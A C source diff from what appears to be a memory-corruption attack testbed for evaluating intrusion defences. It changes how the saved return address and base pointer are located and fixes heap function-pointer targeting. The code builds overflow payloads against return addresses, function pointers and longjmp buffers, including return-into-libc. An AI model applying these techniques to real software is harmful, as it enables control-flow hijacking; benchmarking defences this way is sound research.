@@ -225,7 +225,7 @@ int main(int argc, char **argv) {
   /* Check if attack form is possible */
   if(is_attack_possible()) {
     //NN
-    perform_attack(output_stream, 42, &dummy_function, stack_jmp_buffer_param_array[i]);
+    perform_attack(output_stream, &dummy_function, stack_jmp_buffer_param_array[i]);
   } else {
     exit(ATTACK_IMPOSSIBLE);
   }
@@ -241,11 +241,14 @@ int main(int argc, char **argv) {
 //but they were moved to the top of the file
 //so that they won't overflow into control variables
 
+//reliable ways to get the adresses of the return address and old base pointer
+#define OLD_BP_PTR   __builtin_frame_address(0)
+#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)
+
 /********************/
 /* PERFORM_ATTACK() */
 /********************/
 void perform_attack(FILE *output_stream,
-		    int dummy_for_offset,
 		    int (*stack_func_ptr_param)(const char *),
 		    jmp_buf stack_jmp_buffer_param) {
 
@@ -290,7 +293,7 @@ void perform_attack(FILE *output_stream,
   /* Target: Function pointer on heap                                       */
   /* This pointer is set by collecting a pointer value in the function      */
   /* pointer array.                                                         */
-  int (*heap_func_ptr)(const char *);
+  int (**heap_func_ptr)(const char *) = 0;
   /* Target: Longjmp buffer on the heap                                     */
   /* Declared after injection buffers to place it "after" on the heap       */
   //jmp_buf heap_jmp_buffer;
@@ -304,7 +307,6 @@ void perform_attack(FILE *output_stream,
   /* Target: Pointer in BSS segment for indirect attack                     */
   /* Declared after injection buffers to place it "after" in the BSS seg    */
   static long bss_dummy_value;
-  static long *bss_mem_ptr;
   /* Target: Function pointer in BSS segment                                */
   /* Declared after injection buffers to place it "after" in the BSS seg    */
   static int (*bss_func_ptr)(const char *);
@@ -320,6 +322,7 @@ void perform_attack(FILE *output_stream,
   static jmp_buf bss_jmp_buffer_indirect;
 
   static struct attackme bss_struct;
+  static long *bss_mem_ptr;
   
 
 
@@ -333,10 +336,6 @@ void perform_attack(FILE *output_stream,
   char format_string_buf[16];
   /* Temporary storage of payload for overflow with fscanf() */
   FILE *fscanf_temp_file;
-  /* Platform specific offset between last function parameter */
-  /* and return address                                       */
-  size_t offset_between_param_and_ret;
-  size_t offset_between_param_and_old_base_ptr;
   CHARPAYLOAD payload;
 
   /* Storage of debug memory dumps (used for debug output) */
@@ -473,9 +472,9 @@ void perform_attack(FILE *output_stream,
     break;
   }
 
-  // Redhat 7.3 specfic	//NN Not really :)
-  offset_between_param_and_ret = 2; // TODO Actually it's 1
-  offset_between_param_and_old_base_ptr = offset_between_param_and_ret + 1;
+  //make sure we actually have an initialized function pointer on the heap
+  if (heap_func_ptr)
+    *heap_func_ptr = fooz;
 
   /************************************/
   /* Set target address for overflow, */
@@ -485,10 +484,10 @@ void perform_attack(FILE *output_stream,
   case DIRECT:
     switch(attack.code_ptr) {
     case RET_ADDR:
-      target_addr = &dummy_for_offset - offset_between_param_and_ret;
+      target_addr = RET_ADDR_PTR;
       break;
-    case OLD_BASE_PTR:  
-      target_addr = &dummy_for_offset - offset_between_param_and_old_base_ptr;
+    case OLD_BASE_PTR:
+      target_addr = OLD_BP_PTR;
       break;
     case FUNC_PTR_STACK_VAR:
       target_addr = &stack_func_ptr;
@@ -581,8 +580,7 @@ void perform_attack(FILE *output_stream,
   /* Configure payload */
   /*********************/
 
-  payload.ptr_to_correct_return_addr =
-    &dummy_for_offset - offset_between_param_and_ret;
+  payload.ptr_to_correct_return_addr = RET_ADDR_PTR;
 
   // Set longjmp buffers
   switch(attack.code_ptr) {
@@ -691,11 +689,10 @@ void perform_attack(FILE *output_stream,
     /* turn is dereferenced to overwrite the target pointer               */
     switch(attack.code_ptr) {
     case RET_ADDR:
-      payload.overflow_ptr = &dummy_for_offset - offset_between_param_and_ret;
+      payload.overflow_ptr = RET_ADDR_PTR;
       break;
     case OLD_BASE_PTR:
-      payload.overflow_ptr =
-	&dummy_for_offset - offset_between_param_and_old_base_ptr;
+      payload.overflow_ptr = OLD_BP_PTR;
       //NN:Change this when we change the return into libc from system to creat
       if(attack.inject_param == RETURN_INTO_LIBC) {
 	payload.fake_return_addr = &creat; //NN42
@@ -1037,8 +1034,7 @@ void perform_attack(FILE *output_stream,
 
     case FUNC_PTR_HEAP:
       // Get the function pointer stored in the overflown heap buffer
-      heap_func_ptr = (void *)(*((long *)heap_func_ptr));
-      ((int (*)(char *,int))heap_func_ptr)("/tmp/rip-eval/f_xxxx",700);
+      ((int (*)(char *,int))*heap_func_ptr)("/tmp/rip-eval/f_xxxx",700);
       break;
 
     case FUNC_PTR_BSS:
